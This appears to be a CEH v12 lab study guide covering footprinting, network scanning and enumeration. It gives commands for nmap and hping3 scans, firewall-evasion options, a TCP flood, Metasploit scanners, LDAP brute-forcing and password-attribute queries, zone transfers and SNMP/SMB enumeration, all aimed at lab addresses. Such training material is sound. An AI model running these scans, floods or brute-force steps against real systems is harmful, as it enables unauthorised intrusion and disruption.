+run                &lt;p&gt;&lt;strong&gt;Key procedural steps / narrative:&lt;/strong&gt; Switch to Parrot Security. Open MATE Terminal. Run &lt;code&gt;sudo su&lt;/code&gt;, password toor. Run &lt;code&gt;cd&lt;/code&gt;. Run &lt;code&gt;recon-ng&lt;/code&gt;. Run &lt;code&gt;help&lt;/code&gt; to view commands. Run &lt;code&gt;marketplace install all&lt;/code&gt; (ignore errors). Run &lt;code&gt;modules search&lt;/code&gt; to view modules. Run &lt;code&gt;workspaces create CEH&lt;/code&gt; (or select), then &lt;code&gt;workspaces list&lt;/code&gt;. Run &lt;code&gt;db insert domains&lt;/code&gt;; at domain (TEXT) type certifiedhacker.com; at notes press Enter. Run &lt;code&gt;show domains&lt;/code&gt;. Run &lt;code&gt;modules load brute&lt;/code&gt; then &lt;code&gt;modules load recon/domains-hosts/brute_hosts&lt;/code&gt;; run &lt;code&gt;run&lt;/code&gt; to harvest hosts. For reverse lookup: &lt;code&gt;modules load reverse_resolve&lt;/code&gt;, &lt;code&gt;modules load recon/hosts-hosts/reverse_resolve&lt;/code&gt;, &lt;code&gt;run&lt;/code&gt;; then &lt;code&gt;show hosts&lt;/code&gt;; &lt;code&gt;back&lt;/code&gt;. For report: &lt;code&gt;modules load reporting&lt;/code&gt;, &lt;code&gt;modules load reporting/html&lt;/code&gt;; set options FILENAME /home/attacker/Desktop/results.html, CREATOR Jason, CUSTOMER &quot;Certifiedhacker Networks&quot;; run &lt;code&gt;run&lt;/code&gt;. Open results.html from Desktop in Firefox; expand Hosts node. For personnel info: new terminal, sudo su, cd, recon-ng; &lt;code&gt;workspaces create reconnaissance&lt;/code&gt;; &lt;code&gt;modules load recon/domains-contacts/whois_pocs&lt;/code&gt;; &lt;code&gt;info&lt;/code&gt;; &lt;code&gt;options set SOURCE facebook.com&lt;/code&gt;; &lt;code&gt;run&lt;/code&gt; (note contacts). For subdomains/IPs: new terminal, sudo su, cd, recon-ng; &lt;code&gt;modules load recon/domains-hosts/hackertarget&lt;/code&gt;; &lt;code&gt;options set SOURCE certifiedhacker.com&lt;/code&gt;; &lt;code&gt;run&lt;/code&gt;. Close all open windows and document all acquired information.&lt;/p&gt;</code></pre>                <p><strong>Footprinting a Target using Maltego</strong> <span class="tool-tag">Maltego</span></p>                <pre><code># Switch to Parrot Security
+sudo maltego
+# password: toor
+# Welcome wizard: MALTEGO ID -&gt; Next; Online Activation (Default) -&gt; Next
+# LICENSE AGREEMENT Accept -&gt; Next; copy login link; open Firefox; CREATE ID; enter details; CONTINUE; create password; verify email
+# Browser login successful -&gt; Next; wait activations; Terms accept; Next; Install data sources; Next; Finish
+# New Graph: drag Website entity; change www.paterva.com to www.certifiedhacker.com
+# Right-click entity -&gt; All Transforms -&gt; To Domains [DNS]
+# certifiedhacker.com -&gt; All Transforms -&gt; To DNS Name [Using Name Schema dictionary]
+# certifiedhacker.com -&gt; All Transforms -&gt; To DNS Name - SOA (Start of Authority)
+# certifiedhacker.com -&gt; All Transforms -&gt; To DNS Name - MX (mail server)
+# certifiedhacker.com -&gt; All Transforms -&gt; To DNS Name - NS (name server)
+# entity -&gt; All Transforms -&gt; To IP Address [DNS]
+# IP entity -&gt; All Transforms -&gt; To location [city, country]
+# www.certifiedhacker.com -&gt; All Transforms -&gt; To Domains [DNS]
+# domain -&gt; All Transforms -&gt; To Entities from WHOIS [IBM Watson]
+# Personal node entities: Email Address, Phone Numbers, Image, Alias, Phrase, etc.                &lt;p&gt;&lt;strong&gt;Key procedural steps / narrative:&lt;/strong&gt; Switch to Parrot Security. Open terminal, run &lt;code&gt;sudo maltego&lt;/code&gt;, password toor. Welcome wizard: select MALTEGO ID, Next. Online Activation (Default), Next. Configure Maltego, accept license, Next. Login Link Options: copy link, open Firefox, paste, Sign In, CREATE ID, enter details, CONTINUE, create strong password, verify email. Browser login successful, Next. Maltego ID Activation completes, Next. Select Data Sources Next, Download Data Sources wait Next, Terms and Conditions check Next, Install Data Sources Next, Help Improve Maltego Next, Web Browser Options Finish. Maltego Community Edition GUI appears; acknowledge Privacy Policy. New Graph window appears. In Entity Palette Infrastructure node, drag Website entity onto graph (default www.paterva.com). Double-click name and change to www.certifiedhacker.com. Right-click entity, select All Transforms. Click To Domains [DNS]; domain displays. Right-click certifiedhacker.com, All Transforms -&gt; To DNS Name [Using Name Schema dictionary]; observe name schemas. Select and delete name schemas. Right-click certifiedhacker.com, All Transforms -&gt; To DNS Name - SOA; returns primary name server and admin email. Select/delete. All Transforms -&gt; To DNS Name - MX; returns mail server. Select/delete. All Transforms -&gt; To DNS Name - NS; returns name servers. Select/delete. All Transforms -&gt; To IP Address [DNS]; displays IP. All Transforms -&gt; To location [city, country]; identifies geographical location. Right-click www.certifiedhacker.com, All Transforms -&gt; To Domains [DNS]. Right-click domain, All Transform -&gt; To Entities from WHOIS [IBM Watson]; returns owner entities. Personal node entities can gather email, phone, image, alias, phrase. Other transforms track social networking accounts/conversations. Attackers can perform enumeration, web app hacking, social engineering. Close all open windows and document all acquired information.&lt;/p&gt;</code></pre>                <p><strong>Footprinting a Target using OSRFramework</strong> <span class="tool-tag">OSRFramework (domainfy, searchfy, usufy, mailfy, phonefy, entify)</span></p>                <pre><code># Switch to Parrot Security
+sudo su
+# password: toor
+cd
+domainfy -n ECCOUNCIL -t all
+searchfy -q &quot;Tim Cook&quot;                &lt;p&gt;&lt;strong&gt;Key procedural steps / narrative:&lt;/strong&gt; Switch to Parrot Security. Open MATE Terminal. Run &lt;code&gt;sudo su&lt;/code&gt;, password toor. Run &lt;code&gt;cd&lt;/code&gt;. Run &lt;code&gt;domainfy -n ECCOUNCIL -t all&lt;/code&gt; (-n nickname/list nicknames, -t list TLDs) to check existing domains; retrieves domains and IP addresses related to target; attackers can find vulnerabilities in subdomains and launch web app attacks. Run &lt;code&gt;searchfy -q &quot;Tim Cook&quot;&lt;/code&gt; (-q query/list queries) to check existence of user details on social platforms (Github, Instagram, Keyserverubuntu); provides profile links for social engineering. Other packages: usufy (registered accounts with usernames), mailfy (email accounts), phonefy (phone existence), entify (entities via regex from URLs). Close all open windows and document all acquired information.&lt;/p&gt;</code></pre>                <p><strong>Footprinting a Target using FOCA</strong> <span class="tool-tag">FOCA</span></p>                <pre><code># Switch to Windows Server 2019 (login Administrator/Pa$$w0rd)
+# Navigate Z:\CEHv12 Module 02 Footprinting and Reconnaissance\Footprinting Tools\FOCA
+# Double-click FOCA.exe
+# Project -&gt; New project
+# Project name: Project of www.eccouncil.org
+# Domain website: www.eccouncil.org
+# Folder where to save documents: Desktop (via Browse For Folder)
+# Create -&gt; OK
+# Search engines: Google, Bing, DuckDuckGo; Extensions: All -&gt; Search All
+# Network node; Domains node -&gt; target domain; Crawling tab -&gt; Google crawling
+# Document Analysis -&gt; Metadata Summary                &lt;p&gt;&lt;strong&gt;Key procedural steps / narrative:&lt;/strong&gt; Switch to Windows Server 2019. Login Administrator/Pa$$w0rd (Networks Yes). Navigate Z:\CEHv12 Module 02...\Footprinting Tools\FOCA and double-click FOCA.exe. Wait initialization. FOCA main window appears. Project -&gt; New project. Enter project name &quot;Project of www.eccouncil.org&quot;; domain website www.eccouncil.org; leave alternative domains empty; under Folder where to save documents click Folder icon, select Desktop, OK; leave other settings default; click Create. Project saved successfully, OK. To extract info, select all three search engines (Google, Bing, DuckDuckGo) under Search engines; under Extensions click All; click Search All. Search All toggles to Stop and gathers info. After scans, Stop toggles back to Search All; metadata results appear. Right-click any URL -&gt; Link(s) -&gt; Open in browser to view extracted file. Navigate FOCA window: click Network node to expand and view network structure (domain may have no clients/servers). Expand Domains node, click target domain (eccouncil.org) to view domain info. Right pane: Crawling tab, click Google crawling button; crawling begins and results appear with domains and severity (low/medium/high). Expand Document Analysis -&gt; Metadata Summary; info on users, folders, printers, software may appear. Attackers can find vulnerabilities and exploit. Close all open windows and document all acquired information.&lt;/p&gt;</code></pre>                <p><strong>Footprinting a Target using BillCipher</strong> <span class="tool-tag">BillCipher</span></p>                <pre><code># Switch to Parrot Security
+sudo su
+# password: toor
+cd BillCipher
+python3 billcipher.py
+# Are you want to collect information of website or IP address? -&gt; website
+# Enter the website address -&gt; www.certifiedhacker.com
+# What information would you like to collect? -&gt; 1 (DNS Lookup)
+# Do you want to continue? -&gt; Yes
+# Repeat: website -&gt; www.certifiedhacker.com -&gt; 3 (GeoIP Lookup) -&gt; Yes
+# website -&gt; www.certifiedhacker.com -&gt; 4 (Subnet Lookup) -&gt; Yes
+# website -&gt; www.certifiedhacker.com -&gt; 6 (Page Links) -&gt; Yes
+# website -&gt; www.certifiedhacker.com -&gt; 8 (HTTP Header) -&gt; Yes
+# website -&gt; www.certifiedhacker.com -&gt; 9 (Host Finder)                &lt;p&gt;&lt;strong&gt;Key procedural steps / narrative:&lt;/strong&gt; Switch to Parrot Security. Open MATE Terminal. Run &lt;code&gt;sudo su&lt;/code&gt;, password toor. Run &lt;code&gt;cd BillCipher&lt;/code&gt;. Run &lt;code&gt;python3 billcipher.py&lt;/code&gt;. BillCipher initializes. At prompt &quot;Are you want to collect information of website or IP address?&quot; type website and press Enter. At &quot;Enter the website address&quot; type www.certifiedhacker.com and press Enter. At &quot;What information would you like to collect?&quot; type 1 for DNS Lookup and press Enter; result displays DNS info. At &quot;Do you want to continue?&quot; type Yes and press Enter. Repeat for GeoIP Lookup (3), Subnet Lookup (4), Page Links (6), HTTP Header (8), Host Finder (9), each time re-entering website and URL. Similarly use other gathering options. Close all open windows and document all acquired information.&lt;/p&gt;</code></pre>                <p><strong>Footprinting a Target using OSINT Framework</strong> <span class="tool-tag">OSINT Framework</span></p>                <pre><code># Windows 11 browser
+https://osintframework.com/
+# Click Username category -&gt; expand Username Search Engines and Specific Sites
+# Click NameCheckr tool -&gt; view NameCheckr website -&gt; close tab
+# Click Domain Name category -&gt; expand Whois Records -&gt; click Domain Dossier
+# Click Metadata category -&gt; click FOCA
+# Explore Email Address, IP Address, Social Networks, Instant Messaging, etc.                &lt;p&gt;&lt;strong&gt;Key procedural steps / narrative:&lt;/strong&gt; Switch to Windows 11. Open any browser, go to https://osintframework.com/. OSINT Framework website appears; observe OSINT tree on left. Clicking categories (Username, Email Address, Domain Name) reveals sub-tree resources. Click Username category, expand Username Search Engines and Specific Sites; observe tools. From Username Search Engines click NameCheckr to navigate to NameCheckr website; close tab to return. Click Domain Name category, expand Whois Records; click Domain Dossier tool; view Domain Dossier website (generates reports from public records about domains/IPs); close tab. Click Metadata category, click FOCA tool; view FOCA website with download link. Explore other categories such as Email Address, IP Address, Social Networks, Instant Messaging and associated tools. Other footprinting tools: Recon-Dog, Grecon, Th3Inspector, Raccoon, Orb. Close all open windows and document all acquired information.&lt;/p&gt;</code></pre>            </div></section>            <section class="lab-task"><h3>Module 03 — Scanning Networks</h3><div class="section-card">                <p><strong>Perform Host Discovery using Nmap</strong> <span class="tool-tag">Nmap</span></p>                <pre><code># ARP ping scan (local subnet) - ARP response means host is active
+nmap -sn -PR 10.10.1.22
+
+# UDP ping scan - UDP response (or ICMP port unreachable) means host is active
+nmap -sn -PU 10.10.1.22
+
+# ICMP ECHO ping scan - ICMP ECHO reply means host is active
+nmap -sn -PE 10.10.1.22
+
+# ICMP ECHO ping sweep across an IP range
+nmap -sn -PE 10.10.1.10-23
+
+# ICMP timestamp ping scan
+nmap -sn -PP 10.10.1.22
+
+# ICMP address mask ping scan (alternative when ECHO is blocked)
+nmap -sn -PM 10.10.1.22
+
+# TCP SYN ping scan - ACK response means host is active
+nmap -sn -PS 10.10.1.22
+
+# TCP ACK ping scan - RST response means host is active
+nmap -sn -PA 10.10.1.22
+
+# IP protocol ping scan - any response to a probe means host is active
+nmap -sn -PO 10.10.1.22</code></pre>                <p><strong>Perform Host Discovery using Angry IP Scanner</strong> <span class="tool-tag">Angry IP Scanner</span></p>                <pre><code># GUI configuration values (no CLI)
+# IP Range: 10.10.1.0  to  10.10.1.255
+# Scanning tab -&gt; Pinging method: Combined UDP+TCP
+# Display tab -&gt; Display in results list: Alive hosts (responding to pings) only
+# Then click Start; note total Hosts alive (here, 7) in Scan Statistics</code></pre>                <p><strong>Perform Port and Service Discovery using MegaPing</strong> <span class="tool-tag">MegaPing</span></p>                <pre><code># GUI workflow values (no CLI)
+# IP Scanner: From 10.10.1.5  To 10.10.1.20 -&gt; Start
+# Port Scanner: Destination Address List 10.10.1.22 -&gt; Add -&gt; select checkbox -&gt; Start
+</code></pre>                <p><strong>Perform Port and Service Discovery using NetScanTools Pro</strong> <span class="tool-tag">NetScanTools Pro</span></p>                <pre><code># GUI workflow values (no CLI)
+# Ping Scanner: Use Default System DNS; Start IP 10.10.1.5 ; End IP 10.10.1.23 -&gt; Start (accept notice)
+# Port Scanner: Target Hostname or IP 10.10.1.22; TCP Full Connect; Scan Range of Ports (accept notice)</code></pre>                <p><strong>Perform Port Scanning using sx Tool</strong> <span class="tool-tag">sx (CLI network scanner)</span></p>                <pre><code># ARP scan of subnet
+sx arp 10.10.1.0/24
+
+# Create ARP cache file in JSON (stdin for TCP/UDP scans)
+sx arp 10.10.1.0/24 --json | tee arp.cache
+
+# TCP scan all ports via ARP cache
+cat arp.cache | sx tcp -p 1-65535 10.10.1.11
+
+# Show available commands
+sx help
+# (also sx --help)
+
+# UDP scan of a closed port (expect Destination Unreachable type 3 / code 3)
+cat arp.cache | sx udp --json -p 53 10.10.1.11
+
+# UDP scan of an open port (no code returned)
+cat arp.cache | sx udp --json -p 500 10.10.1.11
+</code></pre>                <p><strong>Explore Various Network Scanning Techniques using Nmap</strong> <span class="tool-tag">Nmap / Zenmap</span></p>                <pre><code># TCP connect / full open scan (verbose)
+nmap -sT -v 10.10.1.22
+
+# Stealth / TCP half-open scan
+nmap -sS -v 10.10.1.22
+
+# Xmas scan (FIN, URG, PUSH)
+nmap -sX -v 10.10.1.22
+
+# TCP Maimon scan (FIN/ACK)
+nmap -sM -v 10.10.1.22
+
+# ACK flag probe scan (firewall mapping)
+nmap -sA -v 10.10.1.22
+
+# UDP scan
+nmap -sU -v 10.10.1.22
+
+# Service version detection
+nmap -sV 10.10.1.22
+
+# Aggressive scan (OS, version, scripts, traceroute) over subnet
+nmap -A 10.10.1.*
+
+# Additional techniques
+# IDLE/IPID header scan
+nmap -sI -v [target IP]
+
+# SCTP INIT scan
+nmap -sY -v [target IP]
+
+# SCTP COOKIE ECHO scan
+nmap -sZ -v [target IP]</code></pre>                <p><strong>Explore Various Network Scanning Techniques using Hping3</strong> <span class="tool-tag">Hping3</span></p>                <pre><code># ACK flag scan on port 80, 5 packets
+hping3 -A 10.10.1.22 -p 80 -c 5
+
+# SYN scan ports 0-100, verbose
+hping3 -8 0-100 -S 10.10.1.22 -V
+
+# FIN/PUSH/URG scan on port 80, 5 packets
+hping3 -F -P -U 10.10.1.22 -p 80 -c 5
+
+# SYN stealth scan ports 0-100
+hping3 --scan 0-100 -S 10.10.1.22
+
+# ICMP ping scan, 5 packets on port 80
+hping3 -1 10.10.1.22 -p 80 -c 5
+
+# Additional techniques
+# Entire subnet live host scan
+hping3 -1 [Target Subnet] --rand-dest -I eth0
+
+# UDP scan
+hping3 -2 [Target IP] -p 80 -c 5</code></pre>                <p><strong>Identify Target OS with TTL and TCP Window Sizes using Wireshark</strong> <span class="tool-tag">Wireshark</span></p>                <pre><code># On Windows 11 command prompt
+ping 10.10.1.22
+ping 10.10.1.9
+
+# Wireshark display filter (optional)
+icmp</code></pre>                <p><strong>Perform OS Discovery using Nmap Script Engine (NSE)</strong> <span class="tool-tag">Nmap / NSE</span></p>                <pre><code># Aggressive scan (OS, version, scripts, traceroute)
+nmap -A 10.10.1.22
+
+# OS discovery
+nmap -O 10.10.1.22
+
+# SMB OS discovery script (ports 445/139)
+nmap --script smb-os-discovery.nse 10.10.1.22</code></pre>                <p><strong>Perform OS Discovery using Unicornscan</strong> <span class="tool-tag">Unicornscan</span></p>                <pre><code># Immediate + verbose mode
+unicornscan 10.10.1.22 -Iv
+unicornscan 10.10.1.9 -Iv</code></pre>                <p><strong>Scan beyond IDS/Firewall using various Evasion Techniques</strong> <span class="tool-tag">Nmap</span></p>                <pre><code># Packet fragmentation
+nmap -f 10.10.1.11
+
+# Source port manipulation (port 80)
+nmap -g 80 10.10.1.11
+
+# MTU 8 bytes
+nmap -mtu 8 10.10.1.11
+
+# IP address decoy (10 random decoys)
+nmap -D RND:10 10.10.1.11
+
+# MAC spoofing (random) + TCP connect + skip host discovery
+nmap -sT -Pn --spoof-mac 0 10.10.1.11</code></pre>                <p><strong>Create Custom Packets using Colasoft Packet Builder to Scan beyond IDS/Firewall</strong> <span class="tool-tag">Colasoft Packet Builder</span></p>                <pre><code># GUI workflow values (no CLI)
+# Adapter: select adapter, OK
+# Add Packet: ARP Packet template; Delta Time 0.1 seconds; OK
+# Send Selected Packets: Burst Mode (no delay); Start; Close
+# Wireshark display filter: arp
+# Export: Selected Packets... -&gt; choose destination, File name, Save as type, Save
+</code></pre>                <p><strong>Create Custom UDP and TCP Packets using Hping3 to Scan beyond IDS/Firewall</strong> <span class="tool-tag">Hping3</span></p>                <pre><code># Custom UDP packets with random source, 500-byte body
+hping3 10.10.1.11 --udp --rand-source --data 500
+
+# TCP SYN on port 80, 5 packets
+hping3 -S 10.10.1.11 -p 80 -c 5
+
+# TCP flood
+hping3 10.10.1.11 --flood</code></pre>                <p><strong>Scan a Target Network using Metasploit</strong> <span class="tool-tag">Metasploit Framework</span></p>                <pre><code># Start DB and launch Metasploit
+service postgresql start
+msfconsole
+
+# Check DB status
+db_status
+
+# If not connected: exit; msfdb init; service postgresql restart; msfconsole; db_status
+
+# Scan subnet and save XML
+nmap -Pn -sS -A -oX Test 10.10.1.0/24
+
+# Import Nmap results
+db_import Test
+
+# View hosts and services
+hosts
+services
+# (or db_services)
+
+# List portscan modules
+search portscan
+
+# SYN portscan module
+use auxiliary/scanner/portscan/syn
+set INTERFACE eth0
+set PORTS 80
+set RHOSTS 10.10.1.5-23
+set THREADS 50
+run
+
+# TCP portscan module
+use auxiliary/scanner/portscan/tcp
+# Option A:
+hosts -R
+# Option B:
+set RHOSTS 10.10.1.22
+run
+
+# SMB version scan
+back
+use auxiliary/scanner/smb/smb_version
+set RHOSTS 10.10.1.5-23
+set THREADS 11
+run</code></pre>                <p><strong>IDS/Firewall Evasion Techniques</strong> <span class="tool-tag">Concepts</span></p>                <pre><code># Techniques to evade IDS/firewall
+Packet Fragmentation: Send fragmented probe packets
+Source Routing: Specify routing path for malformed packet
+Source Port Manipulation: Use common source ports (80, 53)
+IP Address Decoy: Generate decoy IPs to hide real scanner
+IP Address Spoofing: Change source IP
+Creating Custom Packets: Craft packets to bypass
+Randomizing Host Order: Scan hosts in random order
+Sending Bad Checksums: Packets with bogus checksums
+Proxy Servers: Chain proxies to hide source
+Anonymizers: Bypass censors and evade rules
+</code></pre>                <p><strong>Metasploit Scanning Modules</strong> <span class="tool-tag">Metasploit</span></p>                <pre><code># Common scanning modules
+auxiliary/scanner/portscan/syn
+auxiliary/scanner/portscan/tcp
+auxiliary/scanner/portscan/ack
+auxiliary/scanner/portscan/xmas
+auxiliary/scanner/smb/smb_version
+auxiliary/scanner/ftp/ftp_version
+
+# Typical variables
+set INTERFACE eth0
+set PORTS 80
+set RHOSTS 10.10.1.5-23
+set THREADS 50
+run
+</code></pre>            </div></section>            <section class="lab-task"><h3>Module 04 — Enumeration</h3><div class="section-card">                <p><strong>Perform NetBIOS Enumeration</strong> <span class="tool-tag">NetBIOS, Windows CMD - nbtstat, net use, NetBIOS Enumerator, Nmap NSE - nbstat.nse</span></p>                <pre><code># Display NetBIOS name table of remote computer (Windows 11, 10.10.1.11)
+nbtstat -a 10.10.1.11
+
+# -a : displays the NetBIOS name table of a remote computer
+
+# List contents of the NetBIOS name cache (names + resolved IPs)
+nbtstat -c
+
+# -c : lists the contents of the NetBIOS name cache
+
+# Display connection information, shared folders/drives, and network status
+net use</code></pre>                <p><strong>Perform NetBIOS Enumeration</strong> <span class="tool-tag">NetBIOS, Windows CMD - nbtstat, net use, NetBIOS Enumerator, Nmap NSE - nbstat.nse</span></p>                <pre><code># Launch tool
+E:\CEH-Tools\CEHv12 Module 04 Enumeration\NetBIOS Enumeration Tools\NetBIOS Enumerator\NetBIOS Enumerater.exe
+
+# Scan range (example): 10.10.1.15 - 10.10.1.100</code></pre>                <p><strong>Perform NetBIOS Enumeration</strong> <span class="tool-tag">NetBIOS, Windows CMD - nbtstat, net use, NetBIOS Enumerator, Nmap NSE - nbstat.nse</span></p>                <pre><code># TCP service/version scan with NetBIOS enumeration
+nmap -sV -v --script nbstat.nse 10.10.1.22
+
+# -sV : service version detection
+# -v  : verbose output (all hosts/ports)
+# --script nbstat.nse : NetBIOS enumeration
+
+# UDP scan on NetBIOS port 137 with NetBIOS enumeration
+nmap -sU -p 137 --script nbstat.nse 10.10.1.22
+
+# -sU : UDP scan
+# -p 137 : NetBIOS name service port
+# --script nbstat.nse : NetBIOS enumeration</code></pre>                <p><strong>Perform SNMP Enumeration</strong> <span class="tool-tag">SNMP, snmp-check, SoftPerfect Network Scanner, SnmpWalk, Nmap NSE - SNMP scripts</span></p>                <pre><code># UDP scan to confirm SNMP port 161 is open
+nmap -sU -p 161 10.10.1.22
+
+# -sU : UDP scan
+# -p 161 : SNMP port
+
+# Enumerate SNMP device (default community &quot;public&quot;)
+snmp-check 10.10.1.22</code></pre>                <p><strong>Perform SNMP Enumeration</strong> <span class="tool-tag">SNMP, snmp-check, SoftPerfect Network Scanner, SnmpWalk, Nmap NSE - SNMP scripts</span></p>                <pre><code># Launch tool
+Network Scanner (SoftPerfect)
+
+# Scan range (example): 10.10.1.5 - 10.10.1.23</code></pre>                <p><strong>Perform SNMP Enumeration</strong> <span class="tool-tag">SNMP, snmp-check, SoftPerfect Network Scanner, SnmpWalk, Nmap NSE - SNMP scripts</span></p>                <pre><code># SNMPv1 walk with community string &quot;public&quot;
+snmpwalk -v1 -c public 10.10.1.22
+
+# -v1 : SNMP version 1
+# -c public : community string
+
+# SNMPv2c walk
+snmpwalk -v2c -c public 10.10.1.22
+
+# -v2c : SNMP version 2c
+# -c public : community string</code></pre>                <p><strong>Perform SNMP Enumeration</strong> <span class="tool-tag">SNMP, snmp-check, SoftPerfect Network Scanner, SnmpWalk, Nmap NSE - SNMP scripts</span></p>                <pre><code># SNMP system description / OS info
+nmap -sU -p 161 --script=snmp-sysdescr 10.10.1.22
+
+# SNMP running processes
+nmap -sU -p 161 --script=snmp-processes 10.10.1.22
+
+# SNMP installed Windows software
+nmap -sU -p 161 --script=snmp-win32-software 10.10.1.22
+
+# SNMP network interfaces
+nmap -sU -p 161 --script=snmp-interfaces 10.10.1.22
+
+# -sU : UDP scan
+# -p 161 : SNMP port
+# --script : NSE script to run</code></pre>                <p><strong>Perform LDAP Enumeration</strong> <span class="tool-tag">LDAP, AD Explorer, Nmap + Python ldap3, ldapsearch</span></p>                <pre><code># Launch tool
+Z:\CEHv12 Module 04 Enumeration\LDAP Enumeration Tools\Active Directory Explorer\ADExplorer.exe
+
+# Connect to: 10.10.1.22 (Windows Server 2022)</code></pre>                <p><strong>Perform LDAP Enumeration</strong> <span class="tool-tag">LDAP, AD Explorer, Nmap + Python ldap3, ldapsearch</span></p>                <pre><code># UDP scan to confirm LDAP port 389
+nmap -sU -p 389 10.10.1.22
+
+# LDAP brute-force authentication via NSE
+nmap -p 389 --script ldap-brute --script-args ldap.base=&#x27;&quot;cn=users,dc=CEH,dc=com&quot;&#x27; 10.10.1.22
+
+# -p 389 : LDAP port
+# ldap-brute : brute-force LDAP authentication
+# ldap.base : base for password guessing attempts
+
+# Manual LDAP enumeration with Python
+python3
+&gt;&gt;&gt; import ldap3
+&gt;&gt;&gt; server = ldap3.Server(&#x27;10.10.1.22&#x27;, get_info=ldap3.ALL, port=389)
+&gt;&gt;&gt; connection = ldap3.Connection(server)
+&gt;&gt;&gt; connection.bind()
+&gt;&gt;&gt; server.info
+&gt;&gt;&gt; connection.search(search_base=&#x27;DC=CEH,DC=com&#x27;, search_filter=&#x27;(&amp;amp;(objectclass=*))&#x27;, search_scope=&#x27;SUBTREE&#x27;, attributes=&#x27;*&#x27;)
+&gt;&gt;&gt; connection.entries
+&gt;&gt;&gt; connection.search(search_base=&#x27;DC=CEH,DC=com&#x27;, search_filter=&#x27;(&amp;amp;(objectclass=person))&#x27;, search_scope=&#x27;SUBTREE&#x27;, attributes=&#x27;userpassword&#x27;)
+&gt;&gt;&gt; connection.entries</code></pre>                <p><strong>Perform LDAP Enumeration</strong> <span class="tool-tag">LDAP, AD Explorer, Nmap + Python ldap3, ldapsearch</span></p>                <pre><code># Get naming contexts
+ldapsearch -h 10.10.1.22 -x -s base namingcontexts
+
+# -x : simple authentication
+# -h : host
+# -s : scope
+
+# Obtain primary domain info
+ldapsearch -h 10.10.1.22 -x -b &quot;DC=CEH,DC=com&quot;
+
+# -b : base DN for search
+
+# Retrieve all objects in directory tree
+ldapsearch -x -h 10.10.1.22 -b &quot;DC=CEH,DC=com&quot; &quot;objectclass=*&quot;</code></pre>                <p><strong>Perform NFS Enumeration</strong> <span class="tool-tag">NFS, RPCScan, SuperEnum</span></p>                <pre><code># Confirm NFS port 2049 open
+nmap -p 2049 10.10.1.19
+
+# -p 2049 : NFS port
+
+# SuperEnum workflow
+cd SuperEnum
+echo &quot;10.10.1.19&quot; &gt;&gt; Target.txt
+./superenum
+# (input: Target.txt)
+# If permission error: chmod +x superenum
+
+# RPCScan workflow
+cd ..
+cd RPCScan
+python3 rpc-scan.py 10.10.1.19 --rpc
+
+# --rpc : lists the RPC (portmapper)</code></pre>                <p><strong>Perform DNS Enumeration</strong> <span class="tool-tag">DNS, dig, nslookup, DNSRecon, Nmap NSE - DNS scripts</span></p>                <pre><code># Linux (Parrot Security): get DNS name servers
+dig ns www.certifiedhacker.com
+
+# ns : returns name servers
+
+# Attempt zone transfer (AXFR)
+dig @ns1.bluehost.com www.certifiedhacker.com axfr
+
+# axfr : retrieves zone information
+
+# Windows (Windows 11): nslookup interactive
+nslookup
+&gt; set querytype=soa
+&gt; certifiedhacker.com
+&gt; ls -d ns1.bluehost.com
+
+# set querytype=soa : SOA record query
+# ls -d : requests a zone transfer</code></pre>                <p><strong>Perform DNS Enumeration</strong> <span class="tool-tag">DNS, dig, nslookup, DNSRecon, Nmap NSE - DNS scripts</span></p>                <pre><code>cd dnsrecon
+chmod +x ./dnsrecon.py
+./dnsrecon.py -h
+./dnsrecon.py -d www.certifiedhacker.com -z
+
+# -d : target domain
+# -z : DNSSEC zone walk with standard enumeration</code></pre>                <p><strong>Perform DNS Enumeration</strong> <span class="tool-tag">DNS, dig, nslookup, DNSRecon, Nmap NSE - DNS scripts</span></p>                <pre><code># Discover available DNS services
+nmap --script=broadcast-dns-service-discovery certifiedhacker.com
+
+# Brute-force subdomains
+nmap -T4 -p 53 --script dns-brute certifiedhacker.com
+
+# -T4 : timing template
+# -p 53 : DNS port
+
+# Enumerate SRV records
+nmap --script dns-srv-enum --script-args &quot;dns-srv-enum.domain=&#x27;certifiedhacker.com&#x27;&quot;</code></pre>                <p><strong>Perform SMTP Enumeration</strong> <span class="tool-tag">SMTP, Nmap NSE - SMTP scripts</span></p>                <pre><code># Enumerate SMTP users
+nmap -p 25 --script=smtp-enum-users 10.10.1.19
+
+# -p 25 : SMTP port
+# smtp-enum-users : user enumeration script
+
+# Check for open relay
+nmap -p 25 --script=smtp-open-relay 10.10.1.19
+
+# smtp-open-relay : open relay check
+
+# List available SMTP commands
+nmap -p 25 --script=smtp-commands 10.10.1.19
+
+# smtp-commands : lists SMTP commands</code></pre>                <p><strong>Perform RPC, SMB, and FTP Enumeration</strong> <span class="tool-tag">RPC, SMB, FTP, NetScanTools Pro, Nmap</span></p>                <pre><code># Launch installer
+E:\CEH-Tools\CEHv12 Module 03 Scanning Networks\Scanning Tools\NetScanTools Pro\nstp11demo.exe
+
+# Targets: 10.10.1.19, 10.10.1.22
+# Credentials: Administrator / Pa$$w0rd
+# RPC target: 10.10.1.19 -&gt; Dump Portmap</code></pre>                <p><strong>Perform RPC, SMB, and FTP Enumeration</strong> <span class="tool-tag">RPC, SMB, FTP, NetScanTools Pro, Nmap</span></p>                <pre><code># Confirm FTP port 21 open
+nmap -p 21 10.10.1.19
+
+# Aggressive scan (OS, version, scripts, traceroute)
+nmap -T4 -A 10.10.1.19
+
+# -T4 : timing template (0-5)
+# -A  : aggressive scan (OS, -sV, -sC, traceroute)
+
+# SMB enumeration on port 445
+nmap -p 445 -A 10.10.1.19
+
+# FTP enumeration on port 21
+nmap -p 21 -A 10.10.1.19
+
+# -p : port to scan
+# -A : aggressive scan</code></pre>                <p><strong>Perform Enumeration using Various Enumeration Tools</strong> <span class="tool-tag">Enumeration Tools, Global Network Inventory, Advanced IP Scanner, Enum4linux</span></p>                <pre><code># Launch tool
+Global Network Inventory (search &quot;gni&quot;)
+
+# Target: 10.10.1.22
+# Credentials: Administrator / Pa$$w0rd
+# Mode: Single address scan</code></pre>                <p><strong>Perform Enumeration using Various Enumeration Tools</strong> <span class="tool-tag">Enumeration Tools, Global Network Inventory, Advanced IP Scanner, Enum4linux</span></p>                <pre><code># Launch tool
+Advanced IP Scanner (search &quot;advanced ip&quot;)
+
+# Scan range: 10.10.1.5 - 10.10.1.23</code></pre>                <p><strong>Perform Enumeration using Various Enumeration Tools</strong> <span class="tool-tag">Enumeration Tools, Global Network Inventory, Advanced IP Scanner, Enum4linux</span></p>                <pre><code># View options
+enum4linux -h
+
+# NetBIOS information
+enum4linux -u martin -p apple -n 10.10.1.22
+
+# -u : username; -p : password; -n : NetBIOS info
+
+# User list
+enum4linux -u martin -p apple -U 10.10.1.22
+
+# -U : get userlist
+
